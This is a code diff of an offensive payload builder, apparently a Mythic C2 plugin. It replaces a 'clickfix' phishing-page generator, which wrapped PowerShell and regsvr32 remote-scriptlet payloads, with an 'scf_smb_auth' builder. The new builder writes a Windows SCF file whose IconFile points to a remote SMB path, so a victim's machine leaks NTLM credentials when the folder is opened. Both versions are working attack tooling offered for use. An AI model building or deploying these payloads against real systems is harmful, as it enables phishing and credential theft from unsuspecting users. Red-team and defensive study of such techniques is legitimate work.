@@ -10,19 +10,27 @@ import shutil
 import base64
 import random
 
-class clickfix(PayloadType):
-    name = "clickfix"
-    file_extension = "html"
+class scf_smb_auth(PayloadType):
+    name = "scf_smb_auth"
+    file_extension = "scf"
     author = "@hegusung"
     supported_os = [SupportedOS.Windows]
-    wrapper = True
-    wrapped_payloads = ["powershell_to_cmd", "cmd_regsvr32_remote_sct"]
-    note = """Creates a clickfix payload"""
+    wrapper = False
+    wrapped_payloads = ["jscript_download_save_execute"]
+    note = """Creates a SCF payload that will generate a SMB authentication to a remote server"""
+    supports_dynamic_loading = True
+    c2_profiles = []
+    mythic_encrypts = True
     translation_container = None # "myPythonTranslation"
-    agent_path = pathlib.Path(".") / "phishingkit"
-    agent_icon_path = agent_path / "agent_functions" / "phishing.svg"
+    agent_path = pathlib.Path(".") / "file"
+    agent_icon_path = agent_path / "agent_functions" / "file.svg"
     agent_code_path = agent_path / "agent_code"
     build_parameters = [
+        BuildParameter(
+            name = "smb_path",
+            parameter_type=BuildParameterType.String,
+            description="Payload SMB Path",
+        ),
     ]
 
     build_steps = [
@@ -35,19 +43,16 @@ class clickfix(PayloadType):
         build_msg = ""
 
         try:
-            cmd_payload = self.wrapped_payload.decode()
-            cmd_payload = cmd_payload.replace('"', '\\"')
 
-            f = open(os.path.join(self.agent_code_path, "clickfix.html.template"), 'r')
-            clickfix_template = f.read()
-            f.close()
+            smb_path = self.get_parameter('smb_path')
+         
+            payload = """[Shell]
+Command=2
+IconFile={smb_path}
+[Taskbar]
+Command=ToggleDesktop"""
 
-            clickfix_args = {
-                "payload": cmd_payload,
-            }
-
-
-            resp.payload = clickfix_template.format(**clickfix_args)
+            resp.payload = payload.format(smb_path=smb_path)
             resp.build_message = "Successfully built!\n"
 
         except Exception as e:
